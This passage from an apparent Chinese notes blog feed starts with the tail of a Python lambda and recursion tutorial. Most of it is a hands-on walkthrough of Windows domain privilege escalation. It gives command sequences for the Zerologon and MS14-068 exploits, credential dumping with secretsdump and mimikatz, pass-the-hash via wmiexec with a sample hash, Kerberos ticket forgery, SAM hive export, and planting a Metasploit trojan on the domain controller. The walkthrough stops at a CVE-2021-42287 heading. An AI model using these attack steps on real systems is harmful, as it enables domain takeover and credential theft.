y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用add_2_nums指向的匿名函数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;10+20=&quot;</span> % add_2_nums(<span class="number">10</span>, <span class="number">20</span>))</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span>+<span class="number">20</span>=<span class="number">30</span></span><br></pre></td></tr></table></figure><p>方式二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">a, b, opt</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a = %d&quot;</span> % a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b = %d&quot;</span> % b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;result = %d&quot;</span> % opt(a, b))  <span class="comment"># 此时opt指向了第7行定义的匿名函数，所以opt(a, b)就相当于调用匿名函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fun(<span class="number">1</span>, <span class="number">2</span>, <span class="keyword">lambda</span> x, y: x + y)  <span class="comment"># 定义一个匿名函数，且将它的引用当做实参进行传递</span></span><br></pre></td></tr></table></figure><h2 id="代码案例"><a href="#代码案例" class="headerlink" title="代码案例"></a>代码案例</h2><p>想一想，下面的数据如何指定按<code>age</code>或<code>name</code>排序？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stus = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;夏洛&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;木木&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">17</span>&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>按照<code>name</code>排序：</p><blockquote><p>列表排序的时候传入的key的值要是一个函数，结合列表的sort方法去理解：</p><p>[3. 序列类型 | 晚上十一点睡觉 (11pmsleep.github.io)](<a href="https://11pmsleep.github.io/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/3">https://11pmsleep.github.io/Python全栈/Python核心编程/3</a>. 序列类型.html#sort)</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stus = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;夏洛&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;木木&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">17</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序前，stus=&quot;</span>, stus)</span><br><span class="line">stus.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序后，stus=&quot;</span>, stus)</span><br></pre></td></tr></table></figure><blockquote><p>这个程序有几个注意点：</p><p><code>lambda x: x[&#39;name&#39;]</code>会悄悄的执行一个迭代，返回的值是所有<code>x</code>字典的<code>name</code>这个key的名字</p><p>也就是返回的是<code>&quot;顾安&quot;、&quot;夏洛&quot;、&quot;木木&quot;</code></p><p>这也就是sort根据索引规则key的值排序的由来！</p><p>再捋一捋<code>stus.sort(key=lambda x: x[&#39;name&#39;])</code>干了什么吧~~</p><p>当前stus是列表，要将列表中元素字典取出来迭代，选出来排序的依据是<code>name</code>，做了如下的事情：</p><p>首先执行<code>sort</code>函数（如果不懂可以参考下面的例子）</p><ol><li><p><code>sort</code>方法会对当前的列表进行迭代，将当前列表中的元素迭代出来，我们这案例迭代的结果是取出字典类型，可以获取到这个列表中的所有的字典</p></li><li><p>在当前的<code>sort</code>方法中运行我们自定义的函数，在第一个步骤中我们通过s0下t方法获取到了这个列表的所有的元素字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;顾安&#x27;</span>，<span class="string">&#x27;age&#x27;</span>:<span class="number">22</span>&#125;</span><br><span class="line"><span class="comment">#在sort函数中调用key所传递的函数的引用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort</span>():</span><br><span class="line">my_sort(字典)</span><br><span class="line">    <span class="comment">#mysort函数是自定义的函数，传入的参数是一个字典，会返回这个字典[&#x27;age&#x27;]，即取出22</span></span><br></pre></td></tr></table></figure></li><li><p>将获取到的所有的age的值进行排序</p></li><li><p>返回一个新的列表</p></li></ol></blockquote><p> 按照<code>age</code>排序：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stus = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;夏洛&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;木木&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">17</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序前，stus=&quot;</span>, stus)</span><br><span class="line">stus.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;age&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序后，stus=&quot;</span>, stus)</span><br></pre></td></tr></table></figure><p>如果不用匿名函数传递给key的话，这个可以定义：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stus = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;夏洛&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;木木&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">17</span>&#125;</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序前，stus=&quot;</span>, stus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mysort</span>(<span class="params">item</span>):</span><br><span class="line">    <span class="keyword">return</span> item[<span class="string">&quot;name&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这个地方传递给key的是一个引用</span></span><br><span class="line">stus.sort(key=mysort)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;排序后，stus=&quot;</span>, stus)</span><br></pre></td></tr></table></figure><blockquote><p>如果还是迷糊可以去看<code>sort</code>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">self, key=<span class="literal">None</span>, reverse=<span class="literal">False</span></span>):  <span class="comment"># type: ignore</span></span><br><span class="line">    <span class="comment"># type: (<span class="type">Any</span>, <span class="built_in">bool</span>) -&gt; <span class="literal">None</span></span></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        tmp_lst = <span class="built_in">sorted</span>(<span class="built_in">zip</span>(self, <span class="built_in">range</span>(<span class="built_in">len</span>(self))), reverse=reverse)</span><br><span class="line">        <span class="built_in">list</span>.__init__(self, [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> tmp_lst])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp_lst = <span class="built_in">sorted</span>(</span><br><span class="line">            <span class="built_in">zip</span>(<span class="built_in">map</span>(key, <span class="built_in">list</span>.__iter__(self)), <span class="built_in">range</span>(<span class="built_in">len</span>(self))), reverse=reverse</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">list</span>.__init__(self, [<span class="built_in">list</span>.__getitem__(self, x[<span class="number">1</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> tmp_lst])</span><br><span class="line">        itm = self.ca.items</span><br><span class="line">        self.ca._items = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> idx, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(tmp_lst):</span><br><span class="line">            old_index = x[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> old_index <span class="keyword">in</span> itm:</span><br><span class="line">                self.ca.items[idx] = itm[old_index]</span><br></pre></td></tr></table></figure></blockquote><h1 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h1><blockquote><p>貌似递归在python中很少用</p></blockquote><h2 id="什么是递归函数"><a href="#什么是递归函数" class="headerlink" title="什么是递归函数"></a>什么是递归函数</h2><p>一个函数在函数体中调用了自己，这样的函数叫递归函数</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_num</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> n + add_num(n - <span class="number">1</span>)  <span class="comment"># 在函数体中调用了函数本身</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="递归函数的作用"><a href="#递归函数的作用" class="headerlink" title="递归函数的作用"></a>递归函数的作用</h2><p>其实递归是一种算法，一般用来解决“树”、“图”等操作，还能解决像“汉罗塔问题”等</p><h2 id="递归案例"><a href="#递归案例" class="headerlink" title="递归案例"></a>递归案例</h2><p>实现计算阶乘 <code>n = 1 * 2 * 3 * ... * n</code></p><p>阶乘分解：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1 = 1</span><br><span class="line">2 = 2 × 1</span><br><span class="line">3 = 3 × 2 × 1</span><br><span class="line">4 = 4 × 3 × 2 × 1</span><br></pre></td></tr></table></figure><p>解决方式一：循环</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mult_nums</span>(<span class="params">n</span>):</span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        ret *= x</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = mult_nums(<span class="number">4</span>)  <span class="comment"># 计算4的阶乘，结果为24</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>解决方式二：递归</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mult_nums</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> n * mult_nums(n-<span class="number">1</span>)  <span class="comment"># 从1计算 依次拿到1,2,6</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = mult_nums(<span class="number">4</span>)  <span class="comment"># 计算4的阶乘，结果为24</span></span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://blog.csdn.net/hohaizx/article/details/78427406">python是值传递还是引用传递</a></li><li><a href="https://blog.csdn.net/qq_45096273/article/details/107387672">Python中位置参数、关键字参数、默认参数和不定长参数(非固定参数)的简介_木偶☜的博客-CSDN博客</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x23 - 域环境提权</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x23-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%8F%90%E6%9D%83.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x23-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%8F%90%E6%9D%83.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="域提权简介"><a href="#域提权简介" class="headerlink" title="域提权简介"></a>域提权简介</h1><p>域提权就相当于在域内横向移动了</p><p>我们从域内普通机器提权拿到域管的过程，即是域内横向移动</p><p>注意：windows中创建用户名时后面带上<code>$符表示创建隐藏用户，在域中，加$</code>标识域账号</p><h2 id="Netlogon域权限提升概述"><a href="#Netlogon域权限提升概述" class="headerlink" title="Netlogon域权限提升概述"></a>Netlogon域权限提升概述</h2><p>2020年08月12日， 微软官方发布了 <strong>NetLogon 特权提升漏洞</strong> 的风险通告。</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a><strong>前置知识：</strong></h3><blockquote><p><strong>认识netlogon服务</strong></p><p><a href="https://blog.51cto.com/qq291951118/1286399">https://blog.51cto.com/qq291951118/1286399</a></p></blockquote><p>在活动目录中比较重要的一个服务-“Netlogon”，此服务在DC和域成员服务器上运行，为域身份验证提供重要服务，如果此服务停止成员服务器将无法登陆到域中，下面是关于Netlogon服务的五点介绍：</p><ol><li><p>Netlogon服务为域控制器<strong>注册所有的srv资源</strong>纪录。这些记录出现在DNS服务器的正向查询区域中的_msdcs, _sites, _tcp, and _udp等文件夹中。<strong>其他计算机利用这些记录查询域活动目录相关的信息</strong>。</p></li><li><p>Netlogon服务维护<strong>计算机和域控制器之间的安全通道</strong>，对用户和服务进行身份验证。它将用户的凭据传递给域控制器，然后返回用户的<strong>域安全标识符和用户权限</strong>。这通常称为 pass-through 身份验证。</p></li><li><p>Netlogon“网络登录”被配置为仅在成员计算机或域控制器加入域时自动启动。在 Windows 2000 Server 系列和 Windows Server 2003 系列中，“网络登录”发布 <strong>DNS 中的服务资源定位器记录</strong>。当此服务运行时，它依赖“服务器”服务和“本地安全机构”服务来侦听传入的请求。</p></li><li><p>在域成员计算机上，<strong>“网络登录”使用命名管道上的 RPC</strong>。在域控制器上，它使用命名管道上的 RPC、RPC over TCP&#x2F;IP、邮筒以及轻型目录访问协议 (LDAP)。</p></li><li><p>Netlogon会常使用的端口：</p></li></ol><table><thead><tr><th>系统服务名称</th><th>Netlogon应用程序协议</th><th>协议</th><th>端口</th></tr></thead><tbody><tr><td>NetBIOS</td><td>数据报服务</td><td>UDP</td><td>138</td></tr><tr><td>NetBIOS</td><td>名称解析</td><td>UDP</td><td>137</td></tr><tr><td>NetBIOS</td><td>会话服务</td><td>TCP</td><td>139</td></tr></tbody></table><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p>攻击者通过<strong>NetLogon（MS-NRPC）</strong>，建立与域控间易受攻击的安全通道时，可利用此漏洞获取<strong>域管</strong>访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。<br>漏洞编号：CVE-2020-1472</p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a><strong>影响版本：</strong></h3><pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1Windows Server 2012Windows Server 2016Windows Server 2019Windows Server, version 1903 (Server Core installation)Windows Server, version 1909 (Server Core installation)Windows Server, version 2004 (Server Core installation)</code></pre><h3 id="域内提权漏洞完整步骤"><a href="#域内提权漏洞完整步骤" class="headerlink" title="域内提权漏洞完整步骤"></a>域内提权漏洞完整步骤</h3><p>环境：域靶场<br>DC ip地址：10.10.10.10</p><ol><li>查看域控主机名称</li></ol><!----><pre><code>net group &quot;domain controllers&quot; /domain</code></pre><ol><li>检测漏洞是否存在</li></ol><ul><li>方法一·：脚本</li></ul><blockquote><p><a href="https://github.com/SecuraBV/CVE-2020-1472.git">https://github.com/SecuraBV/CVE-2020-1472.git</a></p></blockquote><pre><code>python3 zerologon_tester.py DC 10.10.10.10脚本后面接的是域控名字和IP一般的实战情况是：提供cs连上目标机器的域内机器，但是一般情况下我们是没有桌面，所以用脚本检测会更好那么需要建立代理，通过代理执行脚本！通过cs在已近上线的机器上建立一个代理！再proxychain连上</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439006.png" alt="image-20220728054611412" style /><p>方法二·：可执行程序（需要先获取到主机的桌面）</p><p>一搜就有（百度</p><p>微软给出的官方检测域内漏洞的工具</p><pre><code>PingClastle.exe</code></pre><ol><li>检测存在漏洞后即可<strong>漏洞利用</strong>，对域账号重置</li></ol><blockquote><p><a href="https://github.com/blackarrowsec/redteam-research">https://github.com/blackarrowsec/redteam-research</a></p></blockquote><pre><code>python3 CVE-2020-1472.py DC DC$ 10.10.10.10攻击后，即置空域控账户</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439581.png" alt="image-20220728054721233" style /><p>这时候可以看一下用户凭证，DC$的hash已被置空</p><p><a href="http://cmd5.com/">http://cmd5.com</a></p><pre><code>mimikatz要以管理员运行privilege::debug查看密码是否为置空状态：lsadunp::dcsync /domain:delay.com /all /csv将查询出的放到http://cmd5.com查询</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439386.png" alt="image-20220728054744547" style /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439501.png" alt="image-20220728054759073" style /><ol><li>获取域控所有 用户hash</li></ol><p>kali自带secretsdump.py脚本&#x2F;usr&#x2F;loacl&#x2F;bin目录下</p><p>我下载在”G:\ATTACK\提权\域提权\impacket-master\impacket\examples\secretsdump.py”目录下</p><pre><code>先安装脚本需要的模块：python3 -m pip installpython3 secretsdump.py &#39;de1ay.com/DC$@10.10.10.10&#39; -no-pass</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439942.png" alt="image-20220728054837880" style /><ol><li>wmiexec进行hash横向连接</li></ol><p>wmiexec.py同样在kali自带&#x2F;usr&#x2F;loacl&#x2F;bin目录下<br>G:\ATTACK\提权\域提权\impacket-master\impacket\examples\同样也有此脚本</p><pre><code>python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:484c4a877bf92ab233572af847b9e530 域名称\Administrator@10.10.10.10执行后会返回该域管理员的权限会话</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439677.png" alt="image-20220728054911692" style /><ol><li>恢复域 - 获取hash</li></ol><p>如果打完后不回复域内的hash，域会崩掉，域成员无法建立联系！</p><p>#获取sam数据库</p><pre><code>导出三个文件reg save HKLM\SYSTEM system.save reg save HKLM\SAM sam.save reg save HKLM\SECURITY security.save 下载刚刚导出的三个文件，下载到我们攻击的脚本目录中lget system.save lget sam.save lget security.save del /f system.save del /f sam.save del /f security.save</code></pre><ol><li>恢复域 - 获取hash</li></ol><p>#解密sam</p><pre><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439570.png" alt="image-20220728055029214"></p><p>要将上面图片中的后半部分：e2474b7ca001fb4d6847a6c1ece68bfb恢复回去，不然域内会有创伤，无法和普通域机器建立联系</p><p>e2474b7ca001fb4d6847a6c1ece68bfb这个是其原本的hash！因为原来的hash被置空，所以要恢复之</p><ol><li>恢复域 - 还原hash</li></ol><blockquote><p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p></blockquote><pre><code>python3 reinstall_original_pw.py DC 10.10.10.10 e2474b7ca001fb4d6847a6c1ece68bfb</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439534.png" alt="image-20220728055425574" style /><p>恢复完即完成了一次完整的域内权限提升，拿到了所有机器权限</p><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><h3 id="Kerberos-漏洞"><a href="#Kerberos-漏洞" class="headerlink" title="Kerberos 漏洞:"></a><strong>Kerberos 漏洞</strong>:</h3><p>该漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。攻击者可能使用这些提升的权限来侵入域中的任何计算机，包括域控制器。攻击者必须有有效的域凭据才能利用此漏洞。拥有域凭据的标准用户帐户可以远程使用受影响的组件；只有本地帐户凭据的用户则不能</p><blockquote><p>**微软官方解释:**<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-068">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-068</a></p></blockquote><h4 id="攻击者可能会使用该漏洞执行哪些操作？"><a href="#攻击者可能会使用该漏洞执行哪些操作？" class="headerlink" title="攻击者可能会使用该漏洞执行哪些操作？"></a><strong>攻击者可能会使用该漏洞执行哪些操作</strong>？</h4><p>攻击者可能使用此漏洞，将未经授权的域用户提升为域管理员帐户。成功利用此漏洞的攻击者可以仿冒域中的任何用户，包括域管理员，并加入任何组。通过冒充域管理员，攻击者可以安装程序；查看、更改或删除数据；或者在任何加入域的系统上创建新帐户。</p><h4 id="攻击者如何利用该漏洞？"><a href="#攻击者如何利用该漏洞？" class="headerlink" title="攻击者如何利用该漏洞？"></a><strong>攻击者如何利用该漏洞？</strong></h4><p>通过身份验证的域用户可以向 Kerberos KDC 发出伪造的 Kerberos 票证，声称该用户就是域管理员。Kerberos KDC 在处理来自攻击者的请求时，会不恰当地验证伪造的票证签名，从而让攻击者能利用域管理员的身份来访问网络上的任何资源。</p><h4 id="该漏洞主要危害哪些系统？"><a href="#该漏洞主要危害哪些系统？" class="headerlink" title="该漏洞主要危害哪些系统？"></a><strong>该漏洞主要危害哪些系统？</strong></h4><p>主要危害配置为 Kerberos 密钥分发中心 (KDC) 的域控制器。</p><h4 id="Kerberos认证原理"><a href="#Kerberos认证原理" class="headerlink" title="Kerberos认证原理:"></a>Kerberos认证原理:</h4><blockquote><p><a href="https://www.cnblogs.com/huamingao/p/7267423.html">https://www.cnblogs.com/huamingao/p/7267423.html</a></p></blockquote><h4 id="Kerberos漏洞原理"><a href="#Kerberos漏洞原理" class="headerlink" title="Kerberos漏洞原理:"></a>Kerberos<strong>漏洞原理:</strong></h4><p><strong>服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向域控dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。</strong></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439530.png" alt="image-20220728055729407" style /><h3 id="漏洞利用前提："><a href="#漏洞利用前提：" class="headerlink" title="漏洞利用前提："></a>漏洞利用前提：</h3><ol><li>域控没有打MS14-068的补丁(KB3011780)</li></ol><p>一般域内机器都是统一打补丁的 可以通过这个方法判断域控有没有打此补丁！</p><ol><li>攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码&#x2F;hash值，以及用户的suid</li></ol><h3 id="相关工具下载"><a href="#相关工具下载" class="headerlink" title="相关工具下载:"></a>相关工具下载:</h3><ul><li>Ms14-068.exe</li></ul><blockquote><p>下载地址:<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p></blockquote><ul><li>PSexec微软官方给出代替wmic的工具，一般横向移动都用这个</li></ul><blockquote><p>下载地址:<a href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h3><ol><li>首先在检测是否有MS14-068这个漏洞,通过查看是否打补丁(KB3011780)来判断是否存在漏洞,在域中补丁都是批量安装</li></ol><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439389.png" alt="image-20220728060101770"></p><ol><li>获取域sid</li></ol><ul><li>每当我们在域内创建用户时，所有用户的域sid都会改变一次</li><li>域管的域sid后三位是-500</li></ul><!----><pre><code>shell whoami /allS-1-5-21-2756371121-2868759905-3853650604-1001</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439686.png" alt="image-20220728060129260"></p><ol><li>获取域hash</li></ol><p>由于是域普通用户，首先<strong>提权</strong>到system然后抓hash</p><p>用插件提权为system权限，再运行mimikatz</p><pre><code>logonpasswords：命令尝试抓取用户hash或者明文密码（beacon中的命令）（如果我们能看到hash就用hash的方式，如果能看到密码就用密码的方式）161cff084477fe596a5db81874498a24</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439384.png" alt="image-20220728060209457"></p><ol><li>清除当前用户票据</li></ol><!----><pre><code>mimikatz kerberos::list列出票据mimikatz kerberos::purge清除票据</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439616.png" alt="image-20220728060300312"></p><ol><li>利用ms14-068.exe提权工具生成伪造的kerberos协议认证证书（先上传工具upload）</li></ol><p>票据创建成功会在目录下生成一个TGT票据文件</p><pre><code>shell MS14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604-1001 -p 1qaz@WSX -d 10.10.10.10-u用户名-s用户sid-p用户密码-d是ip如果是抓到hash就把-p选项修改为对应的-rc4接hash值！！！！！</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439152.png" alt="image-20220728060341878"></p><ol><li>利用mimikatz.exe将证书写入，从而提升为域管理员</li></ol><!----><pre><code>mimikatz kerberos::ptc TGT_11@de1ay.com.ccache</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439945.png" alt="image-20220728060412861"></p><ol><li>再次列出域控制器的C盘目录,成功访问域控的C盘,说明普通域用户提权成功</li></ol><!----><pre><code>shell dir \\10.10.10.10\c$</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439855.png" alt="image-20220728060427657"></p><ol><li>最后再上传工具PsExec.exe</li></ol><p>通过这个工具我们可以远程操控域控主机！执行命令</p><pre><code>shell Psexec.exe \\10.10.10.10 whoami</code></pre><ol><li>接下来上线CS或者msf</li></ol><p>生成msf正向连接木马（因为反向连接，对面的机器找不到我们）</p><pre><code>msfvenom -p ^^^^^^</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439403.png" alt="image-20220802064100599" style /><p>配置监听（挂上代理后再运行哦）：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439889.png" alt="image-20220802064317072" style /><p>为了能监听到，连接上目标机器，我们的正向连接需要借助cs中的socks代理！</p><pre><code>点击cs代理中的Tunnel复制生成的命令到msf中将msf挂载到cs建立的socks代理中</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439737.png" alt="image-20220802064443454" style /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439505.png" alt="image-20220802064627710" style /><p>运行监听！</p><p>上传木马:</p><pre><code>先在域内机器上传msf木马，upload即可再shell copy复制到10.10.10.10的c盘shell copy b11.exe \\10.10.10.10\c$</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439745.png" alt="image-20220802064755706"></p><p>打开一个桌面服务！</p><p>（因为如果直接再beacon中执行shell psexec.exe  \\10.10.10.10 cmd.exe只能看到其执行成功，但是拿不到一个交互式的shell）</p><p>如果是msf’，就可以不用桌面，msf有交互式的shell！</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439806.png" alt="image-20220802065237842" style /><p>通过域内机器桌面拿到域控的cmd权限</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439966.png" alt="image-20220802065355454" style /><p>运行我们上传的msf木马：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439277.png" alt="image-20220802065459141" style /><p>上线成功！！！</p><h2 id="cve-2021-42287-x2F-cve-2021-42278"><a href="#cve-2021-42287-x2F-cve-2021-42278" class="headerlink" title="cve-2021-42287&#x2F;cve-2021-42278"></a>cve-2021-42287&#x2F;cve-2021-42278</h2><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" 